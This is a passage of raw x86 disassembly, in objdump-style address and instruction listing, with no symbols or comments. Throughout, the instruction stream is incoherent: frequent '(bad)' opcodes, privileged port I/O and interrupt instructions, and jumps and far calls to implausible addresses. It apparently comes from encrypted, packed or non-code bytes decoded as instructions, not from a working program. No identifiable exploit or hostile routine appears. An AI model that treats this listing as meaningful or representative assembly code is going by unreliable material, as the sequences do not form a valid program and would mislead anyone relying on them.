  40ee04:	mov    eax,0x66e6b77c
  40ee09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee0a:	mov    eax,ds:0xa19c30d8
  40ee0f:	pop    ebx
  40ee10:	lods   al,BYTE PTR ds:[esi]
  40ee11:	retf   0x6019
  40ee14:	jp     0x40ed97
  40ee16:	rol    BYTE PTR [ebp+0x69],1
  40ee19:	das    
  40ee1a:	(bad)  
  40ee1b:	fs test al,0x74
  40ee1e:	jmp    0xbcc524ea
  40ee23:	push   eax
  40ee24:	int3   
  40ee25:	out    dx,al
  40ee26:	mul    esi
  40ee28:	dec    edx
  40ee29:	loope  0x40ee42
  40ee2b:	leave  
  40ee2c:	inc    ebp
  40ee2d:	int3   
  40ee2e:	leave  
  40ee2f:	arpl   WORD PTR [ecx+0x3a],ax
  40ee32:	aam    0x1a
  40ee34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee35:	xor    al,0x9d
  40ee37:	fimul  DWORD PTR [ecx+0x2462a17b]
  40ee3d:	mov    esi,0x616b9627
  40ee42:	mov    esi,0x2478001c
  40ee47:	sahf   
  40ee48:	jae    0x40ede9
  40ee4a:	rcl    BYTE PTR [edi],0x91
  40ee4d:	in     eax,0x81
  40ee4f:	mov    edx,0x57c3fa98
  40ee54:	or     al,0x9f
  40ee56:	sbb    BYTE PTR [ecx+0x3e],0x15
  40ee5a:	push   ds
  40ee5b:	cmc    
  40ee5c:	jns    0x40edfc
  40ee5e:	rol    DWORD PTR [ecx-0x5bcdf884],1
  40ee64:	pop    edi
  40ee65:	push   0xffffff88
  40ee67:	mov    dh,bh
  40ee69:	xor    DWORD PTR [eax-0x70502c44],esp
  40ee6f:	push   esp
  40ee70:	adc    DWORD PTR [edx-0x21],ebx
  40ee73:	xchg   esi,eax
  40ee74:	sahf   
  40ee75:	and    ebx,DWORD PTR [edi+0x9]
  40ee78:	(bad)  
  40ee79:	call   0x15a97b5b
  40ee7e:	or     eax,0x459c418f
  40ee83:	leave  
  40ee84:	pusha  
  40ee85:	dec    edi
  40ee86:	or     eax,0x82014054
  40ee8b:	jle    0x40ee78
  40ee8d:	sbb    BYTE PTR [edi+ebx*4],dh
  40ee90:	sar    BYTE PTR [ecx-0x3a],cl
  40ee93:	pop    ds
  40ee94:	mov    bl,0x75
  40ee96:	sub    edx,DWORD PTR [eax]
  40ee98:	les    esp,FWORD PTR [esi-0xc60b706]
  40ee9e:	rol    BYTE PTR [edi-0x5d3b0a25],1
  40eea4:	xchg   DWORD PTR [edx-0x58],ebp
  40eea7:	sub    DWORD PTR [esi+0x65f1bb4],ebx
  40eead:	retf   0x5ec9
  40eeb0:	lahf   
  40eeb1:	movaps XMMWORD PTR [edx],xmm3
  40eeb4:	dec    ebp
  40eeb5:	push   edx
  40eeb6:	div    BYTE PTR [edx+0x38]
  40eeb9:	ja     0x40ee5c
  40eebb:	std    
  40eebc:	xor    dl,dh
  40eebe:	mov    eax,0x7fc54d41
  40eec3:	push   eax
  40eec4:	pop    ebp
  40eec5:	add    DWORD PTR [edi+0x47a6b574],0xd41c481a
  40eecf:	jmp    0xf98b1d9a
  40eed4:	inc    ebx
  40eed5:	mov    dh,0x2e
  40eed7:	jns    0x40eea3
  40eed9:	fst    QWORD PTR [ecx-0x27]
  40eedc:	pop    eax
  40eedd:	mov    al,0x8
  40eedf:	cmp    DWORD PTR [ecx],esp
  40eee1:	sbb    eax,0x485bd960
  40eee6:	mov    al,ds:0x15893b85
  40eeeb:	xlat   BYTE PTR ds:[ebx]
  40eeec:	shr    BYTE PTR [eax],cl
  40eeee:	cmp    cl,cl
  40eef0:	nop
  40eef1:	mov    ds:0xb4df685a,al
  40eef6:	into   
  40eef7:	outs   dx,DWORD PTR ds:[esi]
  40eef8:	sbb    al,0x24
  40eefa:	xchg   ebp,eax
  40eefb:	inc    ebx
  40eefc:	jo     0x40eefd
  40eefe:	push   0xffffff9c
  40ef00:	sub    BYTE PTR [eax+0x7b6cd377],dh
  40ef06:	jae    0x40eeaf
  40ef08:	inc    edi
  40ef09:	cli    
  40ef0a:	pop    esi
  40ef0b:	xor    al,0x66
  40ef0d:	mul    BYTE PTR [esi+ebp*4+0x76]
  40ef11:	mov    bl,0x93
  40ef13:	push   edi
  40ef14:	gs ja  0x40ef54
  40ef17:	mov    dh,0x68
  40ef19:	mov    dh,0xe8
  40ef1b:	retf   0x7452
  40ef1e:	lods   al,BYTE PTR ds:[esi]
  40ef1f:	or     BYTE PTR [eax+0x166dad2a],cl
  40ef25:	loop   0x40ef07
  40ef27:	adc    eax,0xeabcf4b8
  40ef2c:	scas   eax,DWORD PTR es:[edi]
  40ef2d:	fidivr DWORD PTR [ebp+eax*8-0x296c2e0]
  40ef34:	popa   
  40ef35:	adc    esp,DWORD PTR [eax-0x30]
  40ef38:	(bad)  
  40ef39:	mov    cs,WORD PTR [esi+0x16259a5e]
  40ef3f:	popf   
  40ef40:	ds addr16 mov ah,0x24
  40ef44:	xchg   edx,eax
  40ef45:	pop    edi
  40ef46:	or     cl,BYTE PTR [ecx]
  40ef48:	cld    
  40ef49:	jb     0x40ef9a
  40ef4b:	jo     0x40eed3
  40ef4d:	aad    0x6a
  40ef4f:	aas    
  40ef50:	jle    0x40ef41
  40ef52:	shl    ecx,1
  40ef54:	shl    DWORD PTR [edx],1
  40ef56:	mov    eax,ds:0xe00f919d
  40ef5b:	call   0xf50f650c
  40ef60:	(bad)  
  40ef61:	loop   0x40ef61
  40ef63:	jno    0x40ef6c
  40ef65:	ret    0x145b
  40ef68:	popf   
  40ef69:	inc    ebp
  40ef6a:	imul   edx,DWORD PTR [ecx-0x71],0xe14a7681
  40ef71:	push   edx
  40ef72:	(bad)  
  40ef73:	push   es
  40ef74:	call   DWORD PTR [edx-0x65c50104]
  40ef7a:	push   ebx
  40ef7b:	inc    edx
  40ef7c:	int    0x52
  40ef7e:	inc    edx
  40ef7f:	retf   0x1c3b
  40ef82:	(bad)  
  40ef83:	inc    DWORD PTR [ebx]
  40ef85:	rol    DWORD PTR [edi+0x16],0x48
  40ef89:	mov    BYTE PTR cs:0xe0f21c54,ah
  40ef90:	sti    
  40ef91:	mov    eax,0xf9f78e11
  40ef96:	pop    ebx
  40ef97:	jecxz  0x40efb4
  40ef99:	mov    ecx,ecx
  40ef9b:	jle    0x40efaf
  40ef9d:	pop    esi
  40ef9e:	push   esi
  40ef9f:	gs mov bh,0xaf
  40efa2:	enter  0x919b,0xc4
  40efa6:	dec    esi
  40efa7:	push   eax
  40efa8:	pop    ebp
  40efa9:	xchg   esi,eax
  40efaa:	xchg   edi,eax
  40efab:	or     eax,0x6f8d2d8
  40efb0:	xor    DWORD PTR [esi],eax
  40efb2:	ds (bad) 
  40efb4:	idiv   BYTE PTR [edi-0x4b]
  40efb7:	(bad)  
  40efb8:	push   edi
  40efb9:	mov    al,0xa9
  40efbb:	push   esp
  40efbc:	mov    bl,0xe4
  40efbe:	cmp    eax,0xdb55a877
  40efc3:	inc    esp
  40efc4:	(bad)  
  40efc5:	scas   eax,DWORD PTR es:[edi]
  40efc6:	adc    BYTE PTR [edx+0x24],bl
  40efc9:	xchg   edi,eax
  40efca:	push   0x4b
  40efcc:	fwait
  40efcd:	adc    BYTE PTR [ecx+0x5fef96eb],bh
  40efd3:	icebp  
  40efd4:	std    
  40efd5:	jecxz  0x40efdb
  40efd7:	jge    0x40ef84
  40efd9:	cmp    eax,0xeea4c661
  40efde:	outs   dx,BYTE PTR ds:[esi]
  40efdf:	(bad)  
  40efe0:	repz popa 
  40efe2:	dec    eax
  40efe3:	dec    edi
  40efe4:	sbb    BYTE PTR [edi-0x1c],ah
  40efe7:	sub    eax,0xbf472e21
  40efec:	fidivr DWORD PTR [edx]
  40efee:	mov    ebp,0x7015e991
  40eff3:	cs dec edx
  40eff5:	outs   dx,BYTE PTR ds:[esi]
  40eff6:	mov    dl,0x15
  40eff8:	sub    al,0xf5
  40effa:	dec    edx
  40effb:	adc    DWORD PTR [ebx-0x5c],ebx
  40effe:	jo     0x40f001
  40f000:	add    BYTE PTR [ecx-0x6c],ch
  40f003:	lahf   
  40f004:	inc    edi
  40f005:	and    BYTE PTR [ecx+0xceeefd2],dl
  40f00b:	mov    eax,0xee7a5a5
  40f010:	in     eax,dx
  40f011:	dec    ebx
  40f012:	inc    ebp
  40f013:	stos   DWORD PTR es:[edi],eax
  40f014:	mov    bl,0x13
  40f016:	pop    esi
  40f017:	push   edi
  40f018:	xchg   ecx,eax
  40f019:	imul   ecx,ebx,0x67c6743
  40f01f:	outs   dx,DWORD PTR ds:[esi]
  40f020:	sbb    dh,BYTE PTR ds:0xcc7e5a1
  40f026:	ins    DWORD PTR es:[edi],dx
  40f027:	push   0xffffffa7
  40f029:	sbb    cl,bh
  40f02b:	shl    BYTE PTR [ebp-0x33b28601],1
  40f031:	adc    al,0xf4
  40f033:	ret    0x2f6
  40f036:	sub    edi,DWORD PTR [ebx-0xa]
  40f039:	mov    ds:0xa17520d0,al
  40f03e:	mov    dl,0x5c
  40f040:	cld    
  40f041:	fdiv   QWORD PTR [edi+0x1133025d]
  40f047:	mov    WORD PTR [ebx],gs
  40f049:	fiadd  WORD PTR [ebx+0x37]
  40f04c:	lds    ebx,FWORD PTR [ebx-0x2f4c772c]
  40f052:	loop   0x40f0a1
  40f054:	mov    dl,0x86
  40f056:	or     ebx,edi
  40f058:	mov    ecx,0x7a5b32fc
  40f05d:	pop    ds
  40f05e:	icebp  
  40f05f:	xchg   ebx,eax
  40f060:	pop    ebx
  40f061:	fcmovnbe st,st(0)
  40f063:	and    dl,BYTE PTR [esp+ecx*8+0x7ae4286d]
  40f06a:	js     0x40f042
  40f06c:	jge    0x40f089
  40f06e:	pop    edi
  40f06f:	or     al,0x37
  40f071:	std    
  40f072:	cs loope 0x40f070
  40f075:	nop
  40f076:	sub    BYTE PTR [edx+ebx*8-0x30],0x11
  40f07b:	dec    ebx
  40f07c:	or     al,dl
  40f07e:	sbb    BYTE PTR [eax+edx*1],cl
  40f081:	and    BYTE PTR [esi+0x7546896f],0x5
  40f088:	jle    0x40f06c
  40f08a:	test   BYTE PTR [bp+si-0x5720],0x6f
  40f090:	mov    ah,0x74
  40f092:	fwait
  40f093:	das    
  40f094:	(bad)  
  40f095:	std    
  40f096:	sub    eax,0x6e59c20b
  40f09b:	push   esi
  40f09c:	cmp    esi,ebx
  40f09e:	or     al,0xd7
  40f0a0:	mov    ds:0x609da459,eax
  40f0a5:	mov    dh,0x72
  40f0a7:	icebp  
  40f0a8:	jnp    0x40f02f
  40f0aa:	repnz test ch,0x58
  40f0ae:	stc    
  40f0af:	dec    ecx
  40f0b0:	int3   
  40f0b1:	pop    eax
  40f0b2:	or     DWORD PTR [esi*1-0xd2d4bb0],0xffffff94
  40f0ba:	pusha  
  40f0bb:	or     DWORD PTR [edi+ebp*8-0x1ecf5053],esi
  40f0c2:	jbe    0x40f0db
  40f0c4:	push   edx
  40f0c5:	fild   QWORD PTR [esi]
  40f0c7:	aam    0xbf
  40f0c9:	push   esi
  40f0ca:	aas    
  40f0cb:	and    ecx,ebp
  40f0cd:	(bad)  
  40f0ce:	test   eax,0x562b7f83
  40f0d3:	and    ebx,ecx
  40f0d5:	sub    eax,0x45950a0e
  40f0da:	test   eax,0x4aee9c1d
  40f0df:	jmp    0xbd9:0x279e7097
  40f0e6:	int3   
  40f0e7:	add    cl,dl
  40f0e9:	dec    esp
  40f0ea:	enter  0x410c,0x89
  40f0ee:	pop    eax
  40f0ef:	scas   al,BYTE PTR es:[edi]
  40f0f0:	xlat   BYTE PTR ds:[ebx]
  40f0f1:	inc    ebx
  40f0f2:	fmul   QWORD PTR [edx]
  40f0f4:	call   0x7989:0xcd118263
  40f0fb:	push   0xffffffa0
  40f0fd:	pop    edx
  40f0fe:	mov    bl,BYTE PTR [esi+0x4168a05e]
  40f104:	jo     0x40f147
  40f106:	jb     0x40f0b9
  40f108:	sbb    dl,al
  40f10a:	mov    al,ds:0xfbede334
  40f10f:	out    0x6b,eax
  40f111:	mov    ch,0x38
  40f113:	sti    
  40f114:	jno    0x40f0b9
  40f116:	rol    BYTE PTR [ebx],0xf2
  40f119:	jmp    0x40f11b
  40f11b:	cdq    
  40f11c:	in     eax,dx
  40f11d:	inc    eax
  40f11e:	jge    0x40f156
  40f120:	pop    ebx
  40f121:	xor    BYTE PTR [edx-0x62],ch
  40f124:	fnstenv [ebx]
  40f126:	packuswb mm6,QWORD PTR [edx+0x472d96d3]
  40f12d:	pop    es
  40f12e:	xor    eax,0xe3a4ce15
  40f133:	cld    
  40f134:	pushf  
  40f135:	pop    esp
  40f136:	push   0xcc8dfd4f
  40f13b:	push   ss
  40f13c:	in     al,dx
  40f13d:	add    esp,DWORD PTR [esp+edi*1+0x1361a689]
  40f144:	ret    0xd7ad
  40f147:	nop
  40f148:	sti    
  40f149:	ins    BYTE PTR es:[edi],dx
  40f14a:	push   0xffffffa3
  40f14c:	outs   dx,DWORD PTR ds:[esi]
  40f14d:	push   eax
  40f14e:	cmp    ch,BYTE PTR [eax]
  40f150:	les    esp,FWORD PTR [ecx]
  40f152:	rcr    BYTE PTR [edx-0x7f],1
  40f155:	aas    
  40f156:	jge    0x40f179
  40f158:	clc    
  40f159:	nop
  40f15a:	xchg   ebp,eax
  40f15b:	and    edx,DWORD PTR [esi+0x7]
  40f15e:	fs std 
  40f160:	sbb    al,0xa0
  40f162:	push   ebp
  40f163:	inc    esi
  40f164:	pushf  
  40f165:	loope  0x40f199
  40f167:	shl    BYTE PTR [esi],0x82
  40f16a:	stos   DWORD PTR es:[edi],eax
  40f16b:	cmp    BYTE PTR [ebx+0x7b61c3],0xdb
  40f172:	mov    esp,0xbe279757
  40f177:	xor    DWORD PTR [ecx],eax
  40f179:	dec    ebp
  40f17a:	pop    ds
  40f17b:	lods   eax,DWORD PTR ds:[esi]
  40f17c:	std    
  40f17d:	shr    ebp,cl
  40f17f:	xchg   esp,eax
  40f180:	bound  edx,QWORD PTR [ebx]
  40f182:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f183:	cwde   
  40f184:	push   ss
  40f185:	push   ecx
  40f186:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f187:	xchg   edx,eax
  40f188:	lods   eax,DWORD PTR ds:[esi]
  40f189:	or     al,0xb
  40f18b:	jg     0x40f12f
  40f18d:	lods   al,BYTE PTR ds:[esi]
  40f18e:	shr    eax,1
  40f190:	jecxz  0x40f198
  40f192:	outs   dx,DWORD PTR ds:[esi]
  40f193:	sub    eax,0xf969a236
  40f198:	xchg   BYTE PTR [eax-0x33848b43],bl
  40f19e:	int    0xe0
  40f1a0:	or     eax,0x5e5b3580
  40f1a5:	ss mov bh,0xd0
  40f1a8:	jmp    0x40f1ef
  40f1aa:	xor    eax,DWORD PTR [ecx]
  40f1ac:	loop   0x40f1ff
  40f1ae:	test   BYTE PTR es:[edi+esi*1],cl
  40f1b2:	xor    BYTE PTR [ecx-0x53],al
  40f1b5:	stos   BYTE PTR es:[edi],al
  40f1b6:	(bad)  
  40f1b7:	cs pop edi
  40f1b9:	xchg   ebp,eax
  40f1ba:	pop    esi
  40f1bb:	jg     0x40f232
  40f1bd:	push   eax
  40f1be:	inc    eax
  40f1bf:	adc    edx,DWORD PTR [edx-0xc04e24]
  40f1c5:	mov    ch,BYTE PTR [edx+eax*2-0x51]
  40f1c9:	sbb    eax,0x63975e4c
  40f1ce:	and    BYTE PTR [ebp-0x3b],dl
  40f1d1:	jge    0x40f1ba
  40f1d3:	ja     0x40f1ff
  40f1d5:	inc    edx
  40f1d6:	(bad)  
  40f1d8:	add    ch,BYTE PTR [edi]
  40f1da:	daa    
  40f1db:	ja     0x40f1e5
  40f1dd:	pushf  
  40f1de:	sub    ebp,DWORD PTR [esi]
  40f1e0:	pop    es
  40f1e1:	int    0x97
  40f1e3:	pop    DWORD PTR [eax]
  40f1e5:	out    0x21,al
  40f1e7:	inc    esi
  40f1e8:	adc    ecx,0xa20848ea
  40f1ee:	out    0x4d,al
  40f1f0:	leave  
  40f1f1:	fidiv  DWORD PTR [edx+edx*4]
  40f1f4:	cli    
  40f1f5:	outs   dx,BYTE PTR ds:[esi]
  40f1f6:	xor    DWORD PTR fs:[edx-0x77fe5e95],0xd4714296
  40f201:	jecxz  0x40f20d
  40f203:	sub    bl,bl
  40f205:	mov    eax,ds:0x17eabd56
  40f20a:	fdiv   QWORD PTR [ebx-0x42]
  40f20d:	push   eax
  40f20e:	popf   
  40f20f:	cwde   
  40f210:	sti    
  40f211:	loop   0x40f236
  40f213:	mov    bl,0xfb
  40f215:	xor    eax,0xffed58d1
  40f21a:	fdiv   st,st(3)
  40f21c:	fs cdq 
  40f21e:	fnsetpm(287 only) 
  40f220:	mov    BYTE PTR [ebx+eiz*8],bl
  40f223:	in     al,0xd4
  40f225:	jge    0x40f268
  40f227:	das    
  40f228:	(bad)  
  40f22a:	test   DWORD PTR [ecx-0x6a],esp
  40f22d:	xor    DWORD PTR [ebx+eiz*2+0x55f49d5a],esi
  40f234:	ror    WORD PTR [ecx],0x86
  40f238:	ret    0x4778
  40f23b:	mov    bl,0x5a
  40f23d:	mov    dh,0x13
  40f23f:	lods   al,BYTE PTR ds:[esi]
  40f240:	enter  0xea1a,0x13
  40f244:	adc    al,0x73
  40f246:	out    dx,al
  40f247:	cmp    BYTE PTR [edi+0x59df3de0],bh
  40f24d:	ja     0x40f220
  40f24f:	in     eax,dx
  40f250:	and    BYTE PTR [eax+edi*8-0x5a],ah
  40f254:	iret   
  40f255:	jo     0x40f1ed
  40f257:	cmp    esp,esi
  40f259:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f25a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f25b:	inc    ebp
  40f25c:	mov    al,0x97
  40f25e:	in     eax,dx
  40f25f:	cmc    
  40f260:	inc    eax
  40f261:	push   eax
  40f262:	mov    eax,0x70d70de3
  40f267:	int    0x7a
  40f269:	js     0x40f1fc
  40f26b:	in     eax,0x5a
  40f26d:	pop    es
  40f26e:	shl    DWORD PTR [ecx+0xdf3d115],cl
  40f274:	ficomp WORD PTR [ecx-0x26]
  40f277:	pop    ecx
  40f278:	cmp    eax,0x2bbf4d56
  40f27d:	jmp    0x42dc:0xae11f368
  40f284:	ss out 0x50,al
  40f287:	mov    dl,0xbf
  40f289:	push   es
  40f28a:	cs push esi
  40f28c:	cwde   
  40f28d:	jno    0x40f21a
  40f28f:	ins    DWORD PTR es:[edi],dx
  40f290:	adc    edx,edx
  40f292:	lock leave 
  40f294:	arpl   WORD PTR [ebx-0x11],sp
  40f297:	test   DWORD PTR es:[ecx+ecx*2+0x3630fa63],ebx
  40f29f:	mov    edx,DWORD PTR [esi+edi*4]
  40f2a2:	(bad)  
  40f2a3:	mov    al,0xf4
  40f2a5:	push   ss
  40f2a6:	idiv   DWORD PTR [edx+ebx*2+0x27]
  40f2aa:	sub    DWORD PTR [ebx-0x6],ebx
  40f2ad:	daa    
  40f2ae:	rol    BYTE PTR [ecx-0x1c],0xd2
  40f2b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2b3:	sbb    eax,DWORD PTR [edx+0x76]
  40f2b6:	push   esi
  40f2b7:	outs   dx,BYTE PTR ds:[esi]
  40f2b8:	inc    ebx
  40f2b9:	clc    
  40f2ba:	rcr    edi,1
  40f2bc:	sub    ah,cl
  40f2be:	loop   0x40f33b
  40f2c0:	pop    edx
  40f2c1:	or     BYTE PTR [eax],dl
  40f2c3:	xchg   DWORD PTR [ebx+esi*2],eax
  40f2c6:	push   0xf822c151
  40f2cb:	sbb    BYTE PTR [ebx],bh
  40f2cd:	push   eax
  40f2ce:	xchg   esi,eax
  40f2cf:	xlat   BYTE PTR ds:[ebx]
  40f2d0:	xor    eax,esi
  40f2d2:	aad    0xea
  40f2d4:	ds pop ebp
  40f2d6:	inc    ebx
  40f2d7:	inc    esi
  40f2d8:	fst    QWORD PTR [ecx+0x39be0410]
  40f2de:	in     al,0x32
  40f2e0:	adc    al,0xdb
  40f2e2:	and    edi,eax
  40f2e4:	les    ebp,FWORD PTR [eax]
  40f2e6:	fisttp DWORD PTR [esp+esi*4]
  40f2e9:	or     bh,BYTE PTR [ebx-0x40ebf50d]
  40f2ef:	in     al,0xdc
  40f2f1:	int3   
  40f2f2:	adc    BYTE PTR [ebx],ah
  40f2f4:	mov    edi,0x9a81156c
  40f2f9:	fcomp  DWORD PTR [ecx-0x73]
  40f2fc:	jmp    DWORD PTR [ecx-0x7c]
  40f2ff:	iret   
  40f300:	cmp    BYTE PTR [ebx],ch
  40f302:	sbb    BYTE PTR [ecx],cl
  40f304:	jb     0x40f30e
  40f306:	addr16 jns 0x40f2da
  40f309:	dec    ebx
  40f30a:	add    BYTE PTR [ebx+0x458c80bf],ch
  40f310:	lock xor eax,0xc296e387
  40f316:	jle    0x40f371
  40f318:	pop    es
  40f319:	jp     0x40f36d
  40f31b:	(bad)  
  40f31c:	fsubr  st,st(5)
  40f31e:	sar    BYTE PTR [esi],cl
  40f320:	iret   
  40f321:	aam    0xff
  40f323:	fwait
  40f324:	pop    ecx
  40f325:	xor    ebx,DWORD PTR [esi+0x6a400333]
  40f32b:	adc    eax,0x95d9a5ae
  40f330:	jle    0x40f321
  40f332:	(bad)  
  40f333:	sbb    eax,0xba14fa36
  40f338:	aas    
  40f339:	jae    0x40f33c
  40f33b:	inc    ebx
  40f33c:	inc    ecx
  40f33d:	push   esp
  40f33e:	add    ebx,DWORD PTR [ecx-0x57]
  40f341:	push   esp
  40f342:	scas   al,BYTE PTR es:[edi]
  40f343:	lahf   
  40f344:	mov    ah,0x43
  40f346:	inc    ecx
  40f347:	push   es
  40f348:	ss xor eax,0xba247874
  40f34e:	pop    esp
  40f34f:	jmp    0x937fcac4
  40f354:	push   esp
  40f355:	std    
  40f356:	dec    esi
  40f357:	push   esp
  40f358:	pop    ecx
  40f359:	shl    ch,cl
  40f35b:	fld    DWORD PTR [eax]
  40f35d:	ins    DWORD PTR es:[edi],dx
  40f35e:	push   esi
  40f35f:	or     al,0xe
  40f361:	jge    0x40f34e
  40f363:	sar    bl,1
  40f365:	call   0x955b:0xb0ef0ef5
  40f36c:	nop
  40f36d:	mov    ebp,0x52b7a4b2
  40f372:	or     eax,0xd4de7af0
  40f377:	push   cs
  40f378:	push   ss
  40f379:	inc    ebp
  40f37a:	outs   dx,BYTE PTR ds:[esi]
  40f37b:	add    eax,0x91f3fee1
  40f380:	pop    ss
  40f381:	repz cld 
  40f383:	mov    DWORD PTR [ecx+ebp*8],edi
  40f386:	jo     0x40f3b7
  40f388:	mov    al,ds:0xc5a6725c
  40f38d:	mov    ah,0x49
  40f38f:	mov    dh,0xc9
  40f391:	aas    
  40f392:	test   al,0xb6
  40f394:	adc    al,0xd7
  40f396:	pusha  
  40f397:	nop
  40f398:	dec    ebx
  40f399:	sub    dl,BYTE PTR [ebx+0x6]
  40f39c:	add    eax,DWORD PTR [esp+eiz*2]
  40f39f:	fs add eax,0x4b2b3178
  40f3a5:	mov    ch,0x5c
  40f3a7:	dec    eax
  40f3a8:	pop    edx
  40f3a9:	popf   
  40f3aa:	or     eax,0x39445f4f
  40f3af:	idiv   BYTE PTR [edi]
  40f3b1:	aas    
  40f3b2:	sbb    eax,0x87773554
  40f3b7:	cs xchg si,ax
  40f3ba:	mov    ds:0xd4b8e854,al
  40f3bf:	test   al,0xa5
  40f3c2:	test   eax,0x18c5d06
  40f3c7:	dec    esp
  40f3c8:	sub    ebp,ebx
  40f3ca:	loope  0x40f3b3
  40f3cc:	sbb    eax,0xc362d8a0
  40f3d1:	fild   QWORD PTR [esi-0x69]
  40f3d4:	or     eax,0x2931a536
  40f3d9:	pop    ds
  40f3da:	mov    eax,0x29030b85
  40f3df:	(bad)  
  40f3e0:	xchg   DWORD PTR [ebx-0x3de75af8],edi
  40f3e6:	xor    edx,DWORD PTR [edi]
  40f3e8:	rcr    BYTE PTR [ebx+0x640123eb],0xb3
  40f3ef:	jmp    0x40f469
  40f3f1:	mov    al,0x19
  40f3f3:	pop    esp
  40f3f4:	mov    ah,0x2e
  40f3f6:	(bad)  
  40f3f7:	mov    dh,0xe9
  40f3f9:	cmp    ebp,DWORD PTR [esi+0xf]
  40f3fc:	pop    ecx
  40f3fd:	cmp    BYTE PTR [eax+0x8],al
  40f400:	push   es
  40f401:	mov    edx,0x4f7d316f
  40f406:	and    DWORD PTR [esi+0x63149e72],ecx
  40f40c:	mov    al,0x80
  40f40e:	or     eax,0x62011a2b
  40f413:	mov    edx,0x912ae07
  40f418:	shr    ch,1
  40f41a:	dec    esp
  40f41b:	push   ecx
  40f41c:	adc    eax,0xa55d4023
  40f421:	arpl   WORD PTR [esp+edx*1+0x72],si
  40f425:	adc    ecx,ebx
  40f427:	jge    0x40f403
  40f429:	cmp    esi,ebx
  40f42b:	ja     0x40f421
  40f42d:	mov    cs,WORD PTR [eax+0x4654bc5c]
  40f433:	fnsave [esi+0x43]
  40f436:	enter  0x9a32,0x2b
  40f43a:	stc    
  40f43b:	xchg   ecx,eax
  40f43c:	mov    ch,0x20
  40f43e:	fmul   QWORD PTR [eax]
  40f440:	dec    ecx
  40f441:	ss sahf 
  40f443:	push   ds
  40f444:	push   ebp
  40f445:	cdq    
  40f446:	call   0x55c9226b
  40f44b:	jb     0x40f492
  40f44d:	xor    al,0x1
  40f44f:	jl     0x40f42b
  40f451:	sti    
  40f452:	cmp    eax,0x3f330802
  40f457:	je     0x40f3e5
  40f459:	xchg   edi,eax
  40f45a:	fcomp  DWORD PTR [ebx+0xa]
  40f45d:	rcr    DWORD PTR [eax-0x6bf1d3b4],cl
  40f463:	loop   0x40f402
  40f465:	daa    
  40f466:	lds    esp,FWORD PTR [esi]
  40f468:	add    BYTE PTR [edx],0x25
  40f46b:	loop   0x40f4e9
  40f46d:	ins    BYTE PTR es:[edi],dx
  40f46e:	cli    
  40f46f:	vunpcklps ymm6,ymm3,YMMWORD PTR [ebx+0x7a]
  40f474:	in     al,0x3e
  40f476:	add    ah,al
  40f478:	xchg   esp,eax
  40f479:	arpl   WORD PTR [ecx-0x58],sp
  40f47c:	pop    esp
  40f47d:	(bad)  
  40f47f:	(bad)  
  40f480:	lods   al,BYTE PTR ds:[esi]
  40f481:	pop    esi
  40f482:	pusha  
  40f483:	cwde   
  40f484:	mov    cl,0xb3
  40f486:	dec    esi
  40f487:	fmul   DWORD PTR [edi-0x75]
  40f48a:	popa   
  40f48b:	push   0x32
  40f48d:	mov    edi,0x74eba9d0
  40f492:	jle    0x40f463
  40f494:	xchg   esi,eax
  40f495:	mov    ds:0xac2a8139,al
  40f49a:	ds fwait
  40f49c:	lds    edi,FWORD PTR [edx]
  40f49e:	loopne 0x40f43f
  40f4a0:	scas   eax,DWORD PTR es:[edi]
  40f4a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4a2:	xor    DWORD PTR [edx-0x35],edi
  40f4a5:	mov    edi,0x6d754849
  40f4aa:	out    dx,eax
  40f4ab:	shl    DWORD PTR [edi-0x5dc03da8],cl
  40f4b1:	rol    BYTE PTR [ebx-0x4a],1
  40f4b4:	pop    esp
  40f4b5:	sub    bh,dh
  40f4b7:	inc    ebp
  40f4b8:	inc    edx
  40f4b9:	fild   WORD PTR [eax]
  40f4bb:	stos   DWORD PTR es:[edi],eax
  40f4bc:	aaa    
  40f4bd:	std    
  40f4be:	cdq    
  40f4bf:	xor    dl,dh
  40f4c1:	loope  0x40f502
  40f4c3:	dec    eax
  40f4c4:	sbb    DWORD PTR [ebp+0x1fde693d],ebx
  40f4ca:	cmp    eax,0xe8fe85ef
  40f4cf:	loop   0x40f51b
  40f4d1:	pushf  
  40f4d2:	pop    ebp
  40f4d3:	xchg   ebx,eax
  40f4d4:	lods   eax,DWORD PTR ds:[esi]
  40f4d5:	loop   0x40f50b
  40f4d7:	mov    bh,0x5a
  40f4d9:	out    0xee,al
  40f4db:	jbe    0x40f51b
  40f4dd:	mov    bh,0xc8
  40f4df:	xor    DWORD PTR [ebp+0x1a],esi
  40f4e2:	sub    bl,dl
  40f4e4:	mov    al,fs:0x76a08662
  40f4ea:	xchg   BYTE PTR [edx+eiz*1+0x17],bl
  40f4ee:	jle    0x40f471
  40f4f0:	push   edi
  40f4f1:	sbb    dh,BYTE PTR ds:[ecx+0x37]
  40f4f5:	shl    BYTE PTR [esi+edi*2+0x1fda8800],cl
  40f4fc:	and    al,0xdd
  40f4fe:	xor    al,0x53
  40f500:	inc    eax
  40f501:	adc    al,0xcf
  40f503:	mov    ah,0xd4
  40f505:	sar    BYTE PTR [ebx],cl
  40f507:	xor    BYTE PTR [ecx-0x66ec1549],dh
  40f50d:	inc    edi
  40f50e:	cs (bad) 
  40f510:	test   al,0x57
  40f512:	push   0x82f5fcbd
  40f517:	push   ss
  40f518:	ins    DWORD PTR es:[edi],dx
  40f519:	push   edx
  40f51a:	mov    bh,0x4a
  40f51c:	cs stos BYTE PTR es:[edi],al
  40f51e:	dec    esp
  40f51f:	scas   al,BYTE PTR es:[edi]
  40f520:	mov    eax,0xff5be52c
  40f525:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f526:	xchg   al,ah
  40f528:	jae    0x40f530
  40f52a:	fadd   st(5),st
  40f52c:	jne    0x40f581
  40f52e:	ds sahf 
  40f530:	sbb    DWORD PTR [edx+0x4dc53457],0x59
  40f537:	push   ecx
  40f538:	mov    ecx,0x83d636fc
  40f53d:	cmp    ebx,DWORD PTR [esi]
  40f53f:	jne    0x40f51f
  40f541:	sub    al,0xd4
  40f543:	jl     0x40f511
  40f545:	enter  0xad1e,0xd7
